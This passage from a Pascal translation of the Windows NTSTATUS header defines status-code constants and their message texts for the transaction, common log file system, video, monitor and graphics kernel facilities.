STATUS_TRANSACTION_NO_SUPERIOR   = NTSTATUS($C019005F);

//
// MessageId: STATUS_EXPIRED_HANDLE
//
// MessageText:
//
// The handle is no longer properly associated with its transaction.  It may have been opened in a transactional resource manager that was subsequently forced to restart.  Please close the handle and open a new one.
//
STATUS_EXPIRED_HANDLE            = NTSTATUS($C0190060);

//
// MessageId: STATUS_TRANSACTION_NOT_ENLISTED
//
// MessageText:
//
// The specified operation could not be performed because the resource manager is not enlisted in the transaction.
//
STATUS_TRANSACTION_NOT_ENLISTED  = NTSTATUS($C0190061);


//
//  CLFS (common log file system) error values
//

//
// MessageId: STATUS_LOG_SECTOR_INVALID
//
// MessageText:
//
// Log service found an invalid log sector.
//
STATUS_LOG_SECTOR_INVALID        = NTSTATUS($C01A0001);

//
// MessageId: STATUS_LOG_SECTOR_PARITY_INVALID
//
// MessageText:
//
// Log service encountered a log sector with invalid block parity.
//
STATUS_LOG_SECTOR_PARITY_INVALID = NTSTATUS($C01A0002);

//
// MessageId: STATUS_LOG_SECTOR_REMAPPED
//
// MessageText:
//
// Log service encountered a remapped log sector.
//
STATUS_LOG_SECTOR_REMAPPED       = NTSTATUS($C01A0003);

//
// MessageId: STATUS_LOG_BLOCK_INCOMPLETE
//
// MessageText:
//
// Log service encountered a partial or incomplete log block.
//
STATUS_LOG_BLOCK_INCOMPLETE      = NTSTATUS($C01A0004);

//
// MessageId: STATUS_LOG_INVALID_RANGE
//
// MessageText:
//
// Log service encountered an attempt access data outside the active log range.
//
STATUS_LOG_INVALID_RANGE         = NTSTATUS($C01A0005);

//
// MessageId: STATUS_LOG_BLOCKS_EXHAUSTED
//
// MessageText:
//
// Log service user log marshalling buffers are exhausted.
//
STATUS_LOG_BLOCKS_EXHAUSTED      = NTSTATUS($C01A0006);

//
// MessageId: STATUS_LOG_READ_CONTEXT_INVALID
//
// MessageText:
//
// Log service encountered an attempt read from a marshalling area with an invalid read context.
//
STATUS_LOG_READ_CONTEXT_INVALID  = NTSTATUS($C01A0007);

//
// MessageId: STATUS_LOG_RESTART_INVALID
//
// MessageText:
//
// Log service encountered an invalid log restart area.
//
STATUS_LOG_RESTART_INVALID       = NTSTATUS($C01A0008);

//
// MessageId: STATUS_LOG_BLOCK_VERSION
//
// MessageText:
//
// Log service encountered an invalid log block version.
//
STATUS_LOG_BLOCK_VERSION         = NTSTATUS($C01A0009);

//
// MessageId: STATUS_LOG_BLOCK_INVALID
//
// MessageText:
//
// Log service encountered an invalid log block.
//
STATUS_LOG_BLOCK_INVALID         = NTSTATUS($C01A000A);

//
// MessageId: STATUS_LOG_READ_MODE_INVALID
//
// MessageText:
//
// Log service encountered an attempt to read the log with an invalid read mode.
//
STATUS_LOG_READ_MODE_INVALID     = NTSTATUS($C01A000B);

//
// MessageId: STATUS_LOG_NO_RESTART
//
// MessageText:
//
// Log service encountered a log stream with no restart area.
//
STATUS_LOG_NO_RESTART            = NTSTATUS($401A000C);

//
// MessageId: STATUS_LOG_METADATA_CORRUPT
//
// MessageText:
//
// Log service encountered a corrupted metadata file.
//
STATUS_LOG_METADATA_CORRUPT      = NTSTATUS($C01A000D);

//
// MessageId: STATUS_LOG_METADATA_INVALID
//
// MessageText:
//
// Log service encountered a metadata file that could not be created by the log file system.
//
STATUS_LOG_METADATA_INVALID      = NTSTATUS($C01A000E);

//
// MessageId: STATUS_LOG_METADATA_INCONSISTENT
//
// MessageText:
//
// Log service encountered a metadata file with inconsistent data.
//
STATUS_LOG_METADATA_INCONSISTENT = NTSTATUS($C01A000F);

//
// MessageId: STATUS_LOG_RESERVATION_INVALID
//
// MessageText:
//
// Log service encountered an attempt to erroneously allocate or dispose reservation space.
//
STATUS_LOG_RESERVATION_INVALID   = NTSTATUS($C01A0010);

//
// MessageId: STATUS_LOG_CANT_DELETE
//
// MessageText:
//
// Log service cannot delete log file or file system container.
//
STATUS_LOG_CANT_DELETE           = NTSTATUS($C01A0011);

//
// MessageId: STATUS_LOG_CONTAINER_LIMIT_EXCEEDED
//
// MessageText:
//
// Log service has reached the maximum allowable containers allocated to a log file.
//
STATUS_LOG_CONTAINER_LIMIT_EXCEEDED = NTSTATUS($C01A0012);

//
// MessageId: STATUS_LOG_START_OF_LOG
//
// MessageText:
//
// Log service has attempted to read or write backwards past the start of the log.
//
STATUS_LOG_START_OF_LOG          = NTSTATUS($C01A0013);

//
// MessageId: STATUS_LOG_POLICY_ALREADY_INSTALLED
//
// MessageText:
//
// Log policy could not be installed because a policy of the same type is already present.
//
STATUS_LOG_POLICY_ALREADY_INSTALLED = NTSTATUS($C01A0014);

//
// MessageId: STATUS_LOG_POLICY_NOT_INSTALLED
//
// MessageText:
//
// Log policy in question was not installed at the time of the request.
//
STATUS_LOG_POLICY_NOT_INSTALLED  = NTSTATUS($C01A0015);

//
// MessageId: STATUS_LOG_POLICY_INVALID
//
// MessageText:
//
// The installed set of policies on the log is invalid.
//
STATUS_LOG_POLICY_INVALID        = NTSTATUS($C01A0016);

//
// MessageId: STATUS_LOG_POLICY_CONFLICT
//
// MessageText:
//
// A policy on the log in question prevented the operation from completing.
//
STATUS_LOG_POLICY_CONFLICT       = NTSTATUS($C01A0017);

//
// MessageId: STATUS_LOG_PINNED_ARCHIVE_TAIL
//
// MessageText:
//
// Log space cannot be reclaimed because the log is pinned by the archive tail.
//
STATUS_LOG_PINNED_ARCHIVE_TAIL   = NTSTATUS($C01A0018);

//
// MessageId: STATUS_LOG_RECORD_NONEXISTENT
//
// MessageText:
//
// Log record is not a record in the log file.
//
STATUS_LOG_RECORD_NONEXISTENT    = NTSTATUS($C01A0019);

//
// MessageId: STATUS_LOG_RECORDS_RESERVED_INVALID
//
// MessageText:
//
// Number of reserved log records or the adjustment of the number of reserved log records is invalid.
//
STATUS_LOG_RECORDS_RESERVED_INVALID = NTSTATUS($C01A001A);

//
// MessageId: STATUS_LOG_SPACE_RESERVED_INVALID
//
// MessageText:
//
// Reserved log space or the adjustment of the log space is invalid.
//
STATUS_LOG_SPACE_RESERVED_INVALID = NTSTATUS($C01A001B);

//
// MessageId: STATUS_LOG_TAIL_INVALID
//
// MessageText:
//
// A new or existing archive tail or base of the active log is invalid.
//
STATUS_LOG_TAIL_INVALID          = NTSTATUS($C01A001C);

//
// MessageId: STATUS_LOG_FULL
//
// MessageText:
//
// Log space is exhausted.
//
STATUS_LOG_FULL                  = NTSTATUS($C01A001D);

//
// MessageId: STATUS_LOG_MULTIPLEXED
//
// MessageText:
//
// Log is multiplexed, no direct writes to the physical log is allowed.
//
STATUS_LOG_MULTIPLEXED           = NTSTATUS($C01A001E);

//
// MessageId: STATUS_LOG_DEDICATED
//
// MessageText:
//
// The operation failed because the log is a dedicated log.
//
STATUS_LOG_DEDICATED             = NTSTATUS($C01A001F);

//
// MessageId: STATUS_LOG_ARCHIVE_NOT_IN_PROGRESS
//
// MessageText:
//
// The operation requires an archive context.
//
STATUS_LOG_ARCHIVE_NOT_IN_PROGRESS = NTSTATUS($C01A0020);

//
// MessageId: STATUS_LOG_ARCHIVE_IN_PROGRESS
//
// MessageText:
//
// Log archival is in progress.
//
STATUS_LOG_ARCHIVE_IN_PROGRESS   = NTSTATUS($C01A0021);

//
// MessageId: STATUS_LOG_EPHEMERAL
//
// MessageText:
//
// The operation requires a non-ephemeral log, but the log is ephemeral.
//
STATUS_LOG_EPHEMERAL             = NTSTATUS($C01A0022);

//
// MessageId: STATUS_LOG_NOT_ENOUGH_CONTAINERS
//
// MessageText:
//
// The log must have at least two containers before it can be read from or written to.
//
STATUS_LOG_NOT_ENOUGH_CONTAINERS = NTSTATUS($C01A0023);

//
// MessageId: STATUS_LOG_CLIENT_ALREADY_REGISTERED
//
// MessageText:
//
// A log client has already registered on the stream.
//
STATUS_LOG_CLIENT_ALREADY_REGISTERED = NTSTATUS($C01A0024);

//
// MessageId: STATUS_LOG_CLIENT_NOT_REGISTERED
//
// MessageText:
//
// A log client has not been registered on the stream.
//
STATUS_LOG_CLIENT_NOT_REGISTERED = NTSTATUS($C01A0025);

//
// MessageId: STATUS_LOG_FULL_HANDLER_IN_PROGRESS
//
// MessageText:
//
// A request has already been made to handle the log full condition.
//
STATUS_LOG_FULL_HANDLER_IN_PROGRESS = NTSTATUS($C01A0026);

//
// MessageId: STATUS_LOG_CONTAINER_READ_FAILED
//
// MessageText:
//
// Log service encountered an error when attempting to read from a log container.
//
STATUS_LOG_CONTAINER_READ_FAILED = NTSTATUS($C01A0027);

//
// MessageId: STATUS_LOG_CONTAINER_WRITE_FAILED
//
// MessageText:
//
// Log service encountered an error when attempting to write to a log container.
//
STATUS_LOG_CONTAINER_WRITE_FAILED = NTSTATUS($C01A0028);

//
// MessageId: STATUS_LOG_CONTAINER_OPEN_FAILED
//
// MessageText:
//
// Log service encountered an error when attempting open a log container.
//
STATUS_LOG_CONTAINER_OPEN_FAILED = NTSTATUS($C01A0029);

//
// MessageId: STATUS_LOG_CONTAINER_STATE_INVALID
//
// MessageText:
//
// Log service encountered an invalid container state when attempting a requested action.
//
STATUS_LOG_CONTAINER_STATE_INVALID = NTSTATUS($C01A002A);

//
// MessageId: STATUS_LOG_STATE_INVALID
//
// MessageText:
//
// Log service is not in the correct state to perform a requested action.
//
STATUS_LOG_STATE_INVALID         = NTSTATUS($C01A002B);

//
// MessageId: STATUS_LOG_PINNED
//
// MessageText:
//
// Log space cannot be reclaimed because the log is pinned.
//
STATUS_LOG_PINNED                = NTSTATUS($C01A002C);

//
// MessageId: STATUS_LOG_METADATA_FLUSH_FAILED
//
// MessageText:
//
// Log metadata flush failed.
//
STATUS_LOG_METADATA_FLUSH_FAILED = NTSTATUS($C01A002D);

//
// MessageId: STATUS_LOG_INCONSISTENT_SECURITY
//
// MessageText:
//
// Security on the log and its containers is inconsistent.
//
STATUS_LOG_INCONSISTENT_SECURITY = NTSTATUS($C01A002E);

//
// MessageId: STATUS_LOG_APPENDED_FLUSH_FAILED
//
// MessageText:
//
// Records were appended to the log or reservation changes were made, but the log could not be flushed.
//
STATUS_LOG_APPENDED_FLUSH_FAILED = NTSTATUS($C01A002F);

//
// MessageId: STATUS_LOG_PINNED_RESERVATION
//
// MessageText:
//
// The log is pinned due to reservation consuming most of the log space. Free some reserved records to make space available.
//
STATUS_LOG_PINNED_RESERVATION    = NTSTATUS($C01A0030);


//
// XDDM Video Facility Error codes (videoprt.sys)
//

//
// MessageId: STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD
//
// MessageText:
//
// {Display Driver Stopped Responding}
// The %hs display driver has stopped working normally. Save your work and reboot the system to restore full display functionality. The next time you reboot the machine a dialog will be displayed giving you a chance to upload data about this failure to Microsoft.
//
STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD = NTSTATUS($C01B00EA);

//
// MessageId: STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD_RECOVERED
//
// MessageText:
//
// {Display Driver Stopped Responding and recovered}
// The %hs display driver has stopped working normally. The recovery had been performed.
//
STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD_RECOVERED = NTSTATUS($801B00EB);

//
// MessageId: STATUS_VIDEO_DRIVER_DEBUG_REPORT_REQUEST
//
// MessageText:
//
// {Display Driver Recovered From Failure}
// The %hs display driver has detected and recovered from a failure. Some graphical operations may have failed. The next time you reboot the machine a dialog will be displayed giving you a chance to upload data about this failure to Microsoft.
//
STATUS_VIDEO_DRIVER_DEBUG_REPORT_REQUEST = NTSTATUS($401B00EC);


//
// Monitor Facility Error codes (monitor.sys)
//

//
// MessageId: STATUS_MONITOR_NO_DESCRIPTOR
//
// MessageText:
//
// Monitor descriptor could not be obtained.
//
STATUS_MONITOR_NO_DESCRIPTOR     = NTSTATUS($C01D0001);

//
// MessageId: STATUS_MONITOR_UNKNOWN_DESCRIPTOR_FORMAT
//
// MessageText:
//
// Format of the obtained monitor descriptor is not supported by this release.
//
STATUS_MONITOR_UNKNOWN_DESCRIPTOR_FORMAT = NTSTATUS($C01D0002);

//
// MessageId: STATUS_MONITOR_INVALID_DESCRIPTOR_CHECKSUM
//
// MessageText:
//
// Checksum of the obtained monitor descriptor is invalid.
//
STATUS_MONITOR_INVALID_DESCRIPTOR_CHECKSUM = NTSTATUS($C01D0003);

//
// MessageId: STATUS_MONITOR_INVALID_STANDARD_TIMING_BLOCK
//
// MessageText:
//
// Monitor descriptor contains an invalid standard timing block.
//
STATUS_MONITOR_INVALID_STANDARD_TIMING_BLOCK = NTSTATUS($C01D0004);

//
// MessageId: STATUS_MONITOR_WMI_DATABLOCK_REGISTRATION_FAILED
//
// MessageText:
//
// WMI data block registration failed for one of the MSMonitorClass WMI subclasses.
//
STATUS_MONITOR_WMI_DATABLOCK_REGISTRATION_FAILED = NTSTATUS($C01D0005);

//
// MessageId: STATUS_MONITOR_INVALID_SERIAL_NUMBER_MONDSC_BLOCK
//
// MessageText:
//
// Provided monitor descriptor block is either corrupted or does not contain monitor's detailed serial number.
//
STATUS_MONITOR_INVALID_SERIAL_NUMBER_MONDSC_BLOCK = NTSTATUS($C01D0006);

//
// MessageId: STATUS_MONITOR_INVALID_USER_FRIENDLY_MONDSC_BLOCK
//
// MessageText:
//
// Provided monitor descriptor block is either corrupted or does not contain monitor's user friendly name.
//
STATUS_MONITOR_INVALID_USER_FRIENDLY_MONDSC_BLOCK = NTSTATUS($C01D0007);

//
// MessageId: STATUS_MONITOR_NO_MORE_DESCRIPTOR_DATA
//
// MessageText:
//
// There is no monitor descriptor data at the specified (offset, size) region.
//
STATUS_MONITOR_NO_MORE_DESCRIPTOR_DATA = NTSTATUS($C01D0008);

//
// MessageId: STATUS_MONITOR_INVALID_DETAILED_TIMING_BLOCK
//
// MessageText:
//
// Monitor descriptor contains an invalid detailed timing block.
//
STATUS_MONITOR_INVALID_DETAILED_TIMING_BLOCK = NTSTATUS($C01D0009);

//
// MessageId: STATUS_MONITOR_INVALID_MANUFACTURE_DATE
//
// MessageText:
//
// Monitor descriptor contains invalid manufacture date.
//
STATUS_MONITOR_INVALID_MANUFACTURE_DATE = NTSTATUS($C01D000A);


//
// Graphics Facility Error codes (dxg.sys, dxgkrnl.sys)
//

//
//   Common Windows Graphics Kernel Subsystem status codes {0x0000..0x00ff}
//
//
// MessageId: STATUS_GRAPHICS_NOT_EXCLUSIVE_MODE_OWNER
//
// MessageText:
//
// Exclusive mode ownership is needed to create unmanaged primary allocation.
//
STATUS_GRAPHICS_NOT_EXCLUSIVE_MODE_OWNER = NTSTATUS($C01E0000);

//
// MessageId: STATUS_GRAPHICS_INSUFFICIENT_DMA_BUFFER
//
// MessageText:
//
// The driver needs more DMA buffer space in order to complete the requested operation.
//
STATUS_GRAPHICS_INSUFFICIENT_DMA_BUFFER = NTSTATUS($C01E0001);

//
// MessageId: STATUS_GRAPHICS_INVALID_DISPLAY_ADAPTER
//
// MessageText:
//
// Specified display adapter handle is invalid.
//
STATUS_GRAPHICS_INVALID_DISPLAY_ADAPTER = NTSTATUS($C01E0002);

//
// MessageId: STATUS_GRAPHICS_ADAPTER_WAS_RESET
//
// MessageText:
//
// Specified display adapter and all of its state has been reset.
//
STATUS_GRAPHICS_ADAPTER_WAS_RESET = NTSTATUS($C01E0003);

//
// MessageId: STATUS_GRAPHICS_INVALID_DRIVER_MODEL
//
// MessageText:
//
// The driver stack doesn't match the expected driver model.
//
STATUS_GRAPHICS_INVALID_DRIVER_MODEL = NTSTATUS($C01E0004);

//
// MessageId: STATUS_GRAPHICS_PRESENT_MODE_CHANGED
//
// MessageText:
//
// Present happened but ended up into the changed desktop mode
//
STATUS_GRAPHICS_PRESENT_MODE_CHANGED = NTSTATUS($C01E0005);

//
// MessageId: STATUS_GRAPHICS_PRESENT_OCCLUDED
//
// MessageText:
//
// Nothing to present due to desktop occlusion
//
STATUS_GRAPHICS_PRESENT_OCCLUDED = NTSTATUS($C01E0006);

//
// MessageId: STATUS_GRAPHICS_PRESENT_DENIED
//
// MessageText:
//
// Not able to present due to denial of desktop access
//
STATUS_GRAPHICS_PRESENT_DENIED   = NTSTATUS($C01E0007);

//
// MessageId: STATUS_GRAPHICS_CANNOTCOLORCONVERT
//
// MessageText:
//
// Not able to present with color conversion
//
STATUS_GRAPHICS_CANNOTCOLORCONVERT = NTSTATUS($C01E0008);

//
// MessageId: STATUS_GRAPHICS_DRIVER_MISMATCH
//
// MessageText:
//
// The kernel driver detected a version mismatch between it and the user mode driver.
//
STATUS_GRAPHICS_DRIVER_MISMATCH  = NTSTATUS($C01E0009);

//
// MessageId: STATUS_GRAPHICS_PARTIAL_DATA_POPULATED
//
// MessageText:
//
// Specified buffer is not big enough to contain entire requested dataset. Partial data populated up to the size of the buffer. Caller needs to provide buffer of size as specified in the partially populated buffer's content (interface specific).
//
STATUS_GRAPHICS_PARTIAL_DATA_POPULATED = NTSTATUS($401E000A);

//
// MessageId: STATUS_GRAPHICS_PRESENT_REDIRECTION_DISABLED
//
// MessageText:
//
// Present redirection is disabled (desktop windowing management subsystem is off).
//
STATUS_GRAPHICS_PRESENT_REDIRECTION_DISABLED = NTSTATUS($C01E000B);

//
// MessageId: STATUS_GRAPHICS_PRESENT_UNOCCLUDED
//
// MessageText:
//
// Previous exclusive VidPn source owner has released its ownership
//
STATUS_GRAPHICS_PRESENT_UNOCCLUDED = NTSTATUS($C01E000C);

//
// MessageId: STATUS_GRAPHICS_WINDOWDC_NOT_AVAILABLE
//
// MessageText:
//
// Window DC is not available for presentation
//
STATUS_GRAPHICS_WINDOWDC_NOT_AVAILABLE = NTSTATUS($C01E000D);

//
// MessageId: STATUS_GRAPHICS_WINDOWLESS_PRESENT_DISABLED
//
// MessageText:
//
// Windowless present is disabled (desktop windowing management subsystem is off).
//
STATUS_GRAPHICS_WINDOWLESS_PRESENT_DISABLED = NTSTATUS($C01E000E);

//
// MessageId: STATUS_GRAPHICS_PRESENT_INVALID_WINDOW
//
// MessageText:
//
// Window handle is invalid
//
STATUS_GRAPHICS_PRESENT_INVALID_WINDOW = NTSTATUS($C01E000F);

//
// MessageId: STATUS_GRAPHICS_PRESENT_BUFFER_NOT_BOUND
//
// MessageText:
//
// No buffer is bound to composition surface
//
STATUS_GRAPHICS_PRESENT_BUFFER_NOT_BOUND = NTSTATUS($C01E0010);

//
// MessageId: STATUS_GRAPHICS_VAIL_STATE_CHANGED
//
// MessageText:
//
// Vail state has been changed
//
STATUS_GRAPHICS_VAIL_STATE_CHANGED = NTSTATUS($C01E0011);

//
// MessageId: STATUS_GRAPHICS_INDIRECT_DISPLAY_ABANDON_SWAPCHAIN
//
// MessageText:
//
// Notifying indirect display UMDF class driver to abandon current swapchain.
//
STATUS_GRAPHICS_INDIRECT_DISPLAY_ABANDON_SWAPCHAIN = NTSTATUS($C01E0012);

//
// MessageId: STATUS_GRAPHICS_INDIRECT_DISPLAY_DEVICE_STOPPED
//
// MessageText:
//
// Notifying indirect display UMDF class driver that indirect display device has been stopped.
//
STATUS_GRAPHICS_INDIRECT_DISPLAY_DEVICE_STOPPED = NTSTATUS($C01E0013);

//
//   Video Memory Manager (VidMM) specific status codes {0x0100..0x01ff}
//
//
// MessageId: STATUS_GRAPHICS_NO_VIDEO_MEMORY
//
// MessageText:
//
// Not enough video memory available to complete the operation.
//
STATUS_GRAPHICS_NO_VIDEO_MEMORY  = NTSTATUS($C01E0100);

//
// MessageId: STATUS_GRAPHICS_CANT_LOCK_MEMORY
//
// MessageText:
//
// Couldn't probe and lock the underlying memory of an allocation.
//
STATUS_GRAPHICS_CANT_LOCK_MEMORY = NTSTATUS($C01E0101);

//
// MessageId: STATUS_GRAPHICS_ALLOCATION_BUSY
//
// MessageText:
//
// The allocation is currently busy.
//
STATUS_GRAPHICS_ALLOCATION_BUSY  = NTSTATUS($C01E0102);

//
// MessageId: STATUS_GRAPHICS_TOO_MANY_REFERENCES
//
// MessageText:
//
// An object being referenced has already reached the maximum reference count and can't be referenced any further.
//
STATUS_GRAPHICS_TOO_MANY_REFERENCES = NTSTATUS($C01E0103);

//
// MessageId: STATUS_GRAPHICS_TRY_AGAIN_LATER
//
// MessageText:
//
// A problem couldn't be solved due to some currently existing condition. The problem should be tried again later.
//
STATUS_GRAPHICS_TRY_AGAIN_LATER  = NTSTATUS($C01E0104);

//
// MessageId: STATUS_GRAPHICS_TRY_AGAIN_NOW
//
// MessageText:
//
// A problem couldn't be solved due to some currently existing condition. The problem should be tried again immediately.
//
STATUS_GRAPHICS_TRY_AGAIN_NOW    = NTSTATUS($C01E0105);

//
// MessageId: STATUS_GRAPHICS_ALLOCATION_INVALID
//
// MessageText:
//
// The allocation is invalid.
//
STATUS_GRAPHICS_ALLOCATION_INVALID = NTSTATUS($C01E0106);

//
// MessageId: STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNAVAILABLE
//
// MessageText:
//
// No more unswizzling aperture are currently available.
//
STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNAVAILABLE = NTSTATUS($C01E0107);

//
// MessageId: STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNSUPPORTED
//
// MessageText:
//
// The current allocation can't be unswizzled by an aperture.
//
STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNSUPPORTED = NTSTATUS($C01E0108);

//
// MessageId: STATUS_GRAPHICS_CANT_EVICT_PINNED_ALLOCATION
//
// MessageText:
//
// The request failed because a pinned allocation can't be evicted.
//
STATUS_GRAPHICS_CANT_EVICT_PINNED_ALLOCATION = NTSTATUS($C01E0109);

//
// MessageId: STATUS_GRAPHICS_INVALID_ALLOCATION_USAGE
//
// MessageText:
//
// The allocation can't be used from its current segment location for the specified operation.
//
STATUS_GRAPHICS_INVALID_ALLOCATION_USAGE = NTSTATUS($C01E0110);

//
// MessageId: STATUS_GRAPHICS_CANT_RENDER_LOCKED_ALLOCATION
//
// MessageText:
//
// A locked allocation can't be used in the current command buffer.
//
STATUS_GRAPHICS_CANT_RENDER_LOCKED_ALLOCATION = NTSTATUS($C01E0111);

//
// MessageId: STATUS_GRAPHICS_ALLOCATION_CLOSED
//
// MessageText:
//
// The allocation being referenced has been closed permanently.
//
STATUS_GRAPHICS_ALLOCATION_CLOSED = NTSTATUS($C01E0112);

//
// MessageId: STATUS_GRAPHICS_INVALID_ALLOCATION_INSTANCE
//
// MessageText:
//
// An invalid allocation instance is being referenced.
//
STATUS_GRAPHICS_INVALID_ALLOCATION_INSTANCE = NTSTATUS($C01E0113);

//
// MessageId: STATUS_GRAPHICS_INVALID_ALLOCATION_HANDLE
//
// MessageText:
//
// An invalid allocation handle is being referenced.
//
STATUS_GRAPHICS_INVALID_ALLOCATION_HANDLE = NTSTATUS($C01E0114);

//
// MessageId: STATUS_GRAPHICS_WRONG_ALLOCATION_DEVICE
//
// MessageText:
//
// The allocation being referenced doesn't belong to the current device.
//
STATUS_GRAPHICS_WRONG_ALLOCATION_DEVICE = NTSTATUS($C01E0115);

//
// MessageId: STATUS_GRAPHICS_ALLOCATION_CONTENT_LOST
//
// MessageText:
//
// The specified allocation lost its content.
//
STATUS_GRAPHICS_ALLOCATION_CONTENT_LOST = NTSTATUS($C01E0116);

//
//   Video GPU Scheduler (VidSch) specific status codes {0x0200..0x02ff}
//
//
// MessageId: STATUS_GRAPHICS_GPU_EXCEPTION_ON_DEVICE
//
// MessageText:
//
// GPU exception is detected on the given device. The device is not able to be scheduled.
//
STATUS_GRAPHICS_GPU_EXCEPTION_ON_DEVICE = NTSTATUS($C01E0200);

//
// MessageId: STATUS_GRAPHICS_SKIP_ALLOCATION_PREPARATION
//
// MessageText:
//
// Skip preparation of allocations referenced by the DMA buffer.
//
STATUS_GRAPHICS_SKIP_ALLOCATION_PREPARATION = NTSTATUS($401E0201);

//
//   Video Present Network Management (VidPNMgr) specific status codes {0x0300..0x03ff}
//
//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY
//
// MessageText:
//
// Specified VidPN topology is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY = NTSTATUS($C01E0300);

//
// MessageId: STATUS_GRAPHICS_VIDPN_TOPOLOGY_NOT_SUPPORTED
//
// MessageText:
//
// Specified VidPN topology is valid but is not supported by this model of the display adapter.
//
STATUS_GRAPHICS_VIDPN_TOPOLOGY_NOT_SUPPORTED = NTSTATUS($C01E0301);

//
// MessageId: STATUS_GRAPHICS_VIDPN_TOPOLOGY_CURRENTLY_NOT_SUPPORTED
//
// MessageText:
//
// Specified VidPN topology is valid but is not supported by the display adapter at this time, due to current allocation of its resources.
//
STATUS_GRAPHICS_VIDPN_TOPOLOGY_CURRENTLY_NOT_SUPPORTED = NTSTATUS($C01E0302);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN
//
// MessageText:
//
// Specified VidPN handle is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN    = NTSTATUS($C01E0303);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE
//
// MessageText:
//
// Specified video present source is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE = NTSTATUS($C01E0304);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET
//
// MessageText:
//
// Specified video present target is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET = NTSTATUS($C01E0305);

//
// MessageId: STATUS_GRAPHICS_VIDPN_MODALITY_NOT_SUPPORTED
//
// MessageText:
//
// Specified VidPN modality is not supported (e.g. at least two of the pinned modes are not cofunctiona);.
//
STATUS_GRAPHICS_VIDPN_MODALITY_NOT_SUPPORTED = NTSTATUS($C01E0306);

//
// MessageId: STATUS_GRAPHICS_MODE_NOT_PINNED
//
// MessageText:
//
// No mode is pinned on the specified VidPN source/target.
//
STATUS_GRAPHICS_MODE_NOT_PINNED  = NTSTATUS($401E0307);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_SOURCEMODESET
//
// MessageText:
//
// Specified VidPN source mode set is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_SOURCEMODESET = NTSTATUS($C01E0308);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_TARGETMODESET
//
// MessageText:
//
// Specified VidPN target mode set is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_TARGETMODESET = NTSTATUS($C01E0309);

//
// MessageId: STATUS_GRAPHICS_INVALID_FREQUENCY
//
// MessageText:
//
// Specified video signal frequency is invalid.
//
STATUS_GRAPHICS_INVALID_FREQUENCY = NTSTATUS($C01E030A);

//
// MessageId: STATUS_GRAPHICS_INVALID_ACTIVE_REGION
//
// MessageText:
//
// Specified video signal active region is invalid.
//
STATUS_GRAPHICS_INVALID_ACTIVE_REGION = NTSTATUS($C01E030B);

//
// MessageId: STATUS_GRAPHICS_INVALID_TOTAL_REGION
//
// MessageText:
//
// Specified video signal total region is invalid.
//
STATUS_GRAPHICS_INVALID_TOTAL_REGION = NTSTATUS($C01E030C);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE_MODE
//
// MessageText:
//
// Specified video present source mode is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE_MODE = NTSTATUS($C01E0310);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET_MODE
//
// MessageText:
//
// Specified video present target mode is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET_MODE = NTSTATUS($C01E0311);

//
// MessageId: STATUS_GRAPHICS_PINNED_MODE_MUST_REMAIN_IN_SET
//
// MessageText:
//
// Pinned mode must remain in the set on VidPN's cofunctional modality enumeration.
//
STATUS_GRAPHICS_PINNED_MODE_MUST_REMAIN_IN_SET = NTSTATUS($C01E0312);

//
// MessageId: STATUS_GRAPHICS_PATH_ALREADY_IN_TOPOLOGY
//
// MessageText:
//
// Specified video present path is already in VidPN's topology.
//
STATUS_GRAPHICS_PATH_ALREADY_IN_TOPOLOGY = NTSTATUS($C01E0313);

//
// MessageId: STATUS_GRAPHICS_MODE_ALREADY_IN_MODESET
//
// MessageText:
//
// Specified mode is already in the mode set.
//
STATUS_GRAPHICS_MODE_ALREADY_IN_MODESET = NTSTATUS($C01E0314);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEOPRESENTSOURCESET
//
// MessageText:
//
// Specified video present source set is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEOPRESENTSOURCESET = NTSTATUS($C01E0315);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDEOPRESENTTARGETSET
//
// MessageText:
//
// Specified video present target set is invalid.
//
STATUS_GRAPHICS_INVALID_VIDEOPRESENTTARGETSET = NTSTATUS($C01E0316);

//
// MessageId: STATUS_GRAPHICS_SOURCE_ALREADY_IN_SET
//
// MessageText:
//
// Specified video present source is already in the video present source set.
//
STATUS_GRAPHICS_SOURCE_ALREADY_IN_SET = NTSTATUS($C01E0317);

//
// MessageId: STATUS_GRAPHICS_TARGET_ALREADY_IN_SET
//
// MessageText:
//
// Specified video present target is already in the video present target set.
//
STATUS_GRAPHICS_TARGET_ALREADY_IN_SET = NTSTATUS($C01E0318);

//
// MessageId: STATUS_GRAPHICS_INVALID_VIDPN_PRESENT_PATH
//
// MessageText:
//
// Specified VidPN present path is invalid.
//
STATUS_GRAPHICS_INVALID_VIDPN_PRESENT_PATH = NTSTATUS($C01E0319);

//
// MessageId: STATUS_GRAPHICS_NO_RECOMMENDED_VIDPN_TOPOLOGY
//
// MessageText:
//
// Miniport has no recommendation for augmentation of the specified VidPN's topology.
//
STATUS_GRAPHICS_NO_RECOMMENDED_VIDPN_TOPOLOGY = NTSTATUS($C01E031A);

//
// MessageId: STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGESET
//
